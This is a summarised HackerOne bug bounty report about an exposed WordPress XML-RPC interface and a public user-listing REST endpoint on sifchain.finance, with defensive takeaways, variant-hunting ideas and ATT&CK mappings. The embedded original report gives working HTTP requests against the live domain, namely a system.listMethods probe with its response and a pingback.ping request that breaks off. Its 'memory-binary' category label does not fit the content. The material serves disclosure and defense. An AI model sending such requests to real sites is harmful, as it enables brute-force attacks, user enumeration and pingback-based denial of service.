# XML-RPC Brute Force and User Enumeration via xmlrpc.php and /wp-json/wp/v2/users

## Metadata
- **Source:** HackerOne
- **Report:** 1147449 | https://hackerone.com/reports/1147449
- **Submitted:** 2021-04-03
- **Reporter:** malagham
- **Program:** Sifchain (HackerOne #1147449)
- **Bounty:** Not specified in report
- **Severity:** medium
- **Vuln:** Brute Force Attack Vector, Information Disclosure, User Enumeration, Denial of Service
- **CVEs:** None
- **Category:** memory-binary

## Summary
The target exposes xmlrpc.php endpoint which lists available XML-RPC methods enabling brute force attacks against user accounts, and the REST API endpoint /wp-json/wp/v2/users publicly reveals all user information without authentication. These misconfigurations can be chained to enumerate valid usernames and launch credential attacks.

## Attack scenario
1. Attacker discovers xmlrpc.php is accessible and enumerates available methods via system.listMethods call
2. Attacker uses system.multicall and blogger/metaWeblog methods to perform password brute force attacks against discovered users
3. Attacker queries /wp-json/wp/v2/users REST endpoint to extract complete user list with public profiles and email information
4. With valid credentials obtained or privileged account identified, attacker uses mt.publishPost or metaWeblog.newPost to inject malicious content
5. Attacker performs distributed brute force attacks leveraging XML-RPC's batch processing capability causing resource exhaustion
6. Account takeover enables backdoor installation, content manipulation, or lateral movement within WordPress infrastructure

## Root cause
XML-RPC interface enabled by default in WordPress without access restrictions; REST API user endpoint publicly accessible without authentication; lack of rate limiting on authentication endpoints; failure to disable legacy XML-RPC methods when not required

## Attacker mindset
Opportunistic reconnaissance targeting WordPress installations; XML-RPC is legacy feature commonly overlooked in hardening; low barrier to entry using standard tools; REST API enumeration requires no special knowledge; combines information gathering with automated attack capability

## Defensive takeaways
- Disable XML-RPC entirely via wp-config.php or disable xmlrpc.php at web server level if not required for third-party integrations
- Implement authentication requirement for /wp-json/wp/v2/users endpoint or remove user listing capability from REST API
- Apply rate limiting and CAPTCHA to login endpoints and XML-RPC methods to prevent brute force attacks
- Implement IP-based access controls or WAF rules to restrict XML-RPC access to trusted sources only
- Use security plugins to disable specific dangerous XML-RPC methods (pingback.ping, blogger.*, metaWeblog.*)
- Monitor and alert on suspicious XML-RPC requests and failed authentication attempts
- Enforce strong password policies and multi-factor authentication for all user accounts

## Variant hunting
Check for other exposed REST API endpoints revealing sensitive information (/wp-json/wp/v2/posts, /wp-json/wp/v2/pages with author details)
Test for JSONP callbacks on REST API endpoints enabling cross-domain user enumeration
Enumerate WordPress user enumeration via author archives /?author=1 redirects and post author metadata
Test wp-json/wp/v2/users?per_page=100 for pagination bypass to extract larger user lists
Check for accessible wp-admin/user-new.php or registration endpoints revealing user existence
Test XML-RPC for pingback vulnerability (CVE-2014-4697) chaining with reflected XSS
Investigate custom XML-RPC methods (prli.* in response) for undocumented API vulnerabilities

## MITRE ATT&CK
- T1087.001 - Account Discovery: Local Account
- T1110.001 - Brute Force: Password Guessing
- T1110.004 - Brute Force: Credential Stuffing
- T1589.001 - Gather Victim Identity Information: Credentials
- T1592 - Gather Victim Host Information
- T1526 - Exposure of Service Enumeration
- T1190 - Exploit Public-Facing Application

## Notes
Report demonstrates chaining of two distinct vulnerabilities (XML-RPC + REST API enumeration) for credential attack campaign. Severity elevated by batch processing capability in XML-RPC reducing detection risk for attackers. sifchain.finance appears to be finance/crypto domain increasing impact if credentials compromise leads to transaction tampering or phishing attacks. Researcher notes out-of-scope reporting; verify current scope boundaries before remediation priority setting.

## Full report
<details><summary>Expand</summary>

Hi Team :)
i am abbas heybati ;)

## Summary:

After reviewing the given scope, I realized that the main domain "http://sifchain.finance"  has several vulnerabilities that I will report to you as a scenario. I realize that I have reported to you outside of Scope. The report is related to the mentioned company and the vulnerability can endanger your business. I consider it my duty to report this vulnerability to you.

###  the XML-RPC interface opens two kinds of attacks:

https://sifchain.finance/xmlrpc.php

- XML-RPC pingbacks
- Brute force attacks via XML-RPC

###And in the  /wp-json/wp/v2/users path, it reveals all the user information
- https://sifchain.finance/wp-json/wp/v2/users

## Steps To Reproduce:

1. For the two vulnerabilities listed above in the xmlrpc.php section, first post a request to xmlrpc.php for `<methodName> system.listMethods </methodName>`
given

### Post Request:

```
POST /xmlrpc.php HTTP/1.1
Host: sifchain.finance
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: __cfduid=dcb7a4e2b0f6a7042e39b0bd33aa4128a1617428272
Upgrade-Insecure-Requests: 1
Content-Length: 135


<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall> 
```

### Response:
```
HTTP/1.1 200 OK
Date: Sat, 03 Apr 2021 05:49:32 GMT
Content-Type: text/xml; charset=UTF-8
Connection: close
Strict-Transport-Security: max-age=15552000; includeSubDomains
Vary: Accept-Encoding
X-hacker: If you're reading this, you should visit automattic.com/jobs and apply to join the fun, mention this header.
Host-Header: WordPress.com
X-ac: 2.hhn _atomic_ams
CF-Cache-Status: DYNAMIC
cf-request-id: 0937e09a790000063171828000000001
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 63a003a3fc550631-FRA
Content-Length: 4653



<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>prli.api_version</string></value>
  <value><string>prli.get_pretty_link_url</string></value>
  <value><string>prli.get_link_from_slug</string></value>
  <value><string>prli.get_link</string></value>
  <value><string>prli.get_all_links</string></value>
  <value><string>prli.get_all_groups</string></value>
  <value><string>prli.create_pretty_link</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  <value><string>mt.getTrackbackPings</string></value>
  <value><string>mt.supportedTextFilters</string></value>
  <value><string>mt.supportedMethods</string></value>
  <value><string>mt.setPostCategories</string></value>
  <value><string>mt.getPostCategories</string></value>
  <value><string>mt.getRecentPostTitles</string></value>
  <value><string>mt.getCategoryList</string></value>
  <value><string>metaWeblog.getUsersBlogs</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <value><string>metaWeblog.newMediaObject</string></value>
  <value><string>metaWeblog.getCategories</string></value>
  <value><string>metaWeblog.getRecentPosts</string></value>
  <value><string>metaWeblog.getPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>blogger.deletePost</string></value>
  <value><string>blogger.editPost</string></value>
  <value><string>blogger.newPost</string></value>
  <value><string>blogger.getRecentPosts</string></value>
  <value><string>blogger.getPost</string></value>
  <value><string>blogger.getUserInfo</string></value>
  <value><string>blogger.getUsersBlogs</string></value>
  <value><string>wp.restoreRevision</string></value>
  <value><string>wp.getRevisions</string></value>
  <value><string>wp.getPostTypes</string></value>
  <value><string>wp.getPostType</string></value>
  <value><string>wp.getPostFormats</string></value>
  <value><string>wp.getMediaLibrary</string></value>
  <value><string>wp.getMediaItem</string></value>
  <value><string>wp.getCommentStatusList</string></value>
  <value><string>wp.newComment</string></value>
  <value><string>wp.editComment</string></value>
  <value><string>wp.deleteComment</string></value>
  <value><string>wp.getComments</string></value>
  <value><string>wp.getComment</string></value>
  <value><string>wp.setOptions</string></value>
  <value><string>wp.getOptions</string></value>
  <value><string>wp.getPageTemplates</string></value>
  <value><string>wp.getPageStatusList</string></value>
  <value><string>wp.getPostStatusList</string></value>
  <value><string>wp.getCommentCount</string></value>
  <value><string>wp.deleteFile</string></value>
  <value><string>wp.uploadFile</string></value>
  <value><string>wp.suggestCategories</string></value>
  <value><string>wp.deleteCategory</string></value>
  <value><string>wp.newCategory</string></value>
  <value><string>wp.getTags</string></value>
  <value><string>wp.getCategories</string></value>
  <value><string>wp.getAuthors</string></value>
  <value><string>wp.getPageList</string></value>
  <value><string>wp.editPage</string></value>
  <value><string>wp.deletePage</string></value>
  <value><string>wp.newPage</string></value>
  <value><string>wp.getPages</string></value>
  <value><string>wp.getPage</string></value>
  <value><string>wp.editProfile</string></value>
  <value><string>wp.getProfile</string></value>
  <value><string>wp.getUsers</string></value>
  <value><string>wp.getUser</string></value>
  <value><string>wp.getTaxonomies</string></value>
  <value><string>wp.getTaxonomy</string></value>
  <value><string>wp.getTerms</string></value>
  <value><string>wp.getTerm</string></value>
  <value><string>wp.deleteTerm</string></value>
  <value><string>wp.editTerm</string></value>
  <value><string>wp.newTerm</string></value>
  <value><string>wp.getPosts</string></value>
  <value><string>wp.getPost</string></value>
  <value><string>wp.deletePost</string></value>
  <value><string>wp.editPost</string></value>
  <value><string>wp.newPost</string></value>
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>

```
2.XML-RPC pingbacks attacks

In this case, an attacker is able to leverage the default XML-RPC API in order to perform callbacks for the following purposes:

- Distributed denial-of-service (DDoS) attacks - An attacker executes the pingback.ping the method from several affected WordPress installations against a single unprotected target (botnet level).
- XSPA (Cross Site Port Attack) - An attacker can execute the pingback.ping the method from a single affected WordPress installation to the same host (or other internal/private host) on different ports. An open port or an internal host can be determined by observing the difference in time of response and/or by looking at the response of the request.

### Post Request:
```
POST /xmlrpc.php HTTP/1.1
Host: sifchain.finance
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: __cfduid=dcb7a4e2b0f6a7042e39b0bd33aa4128a1617428272
Upgrade-Insecure-Requests: 1
Content-Length: 285



<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>https:

</details>

---
*Analysed by Claude on 2026-05-24*
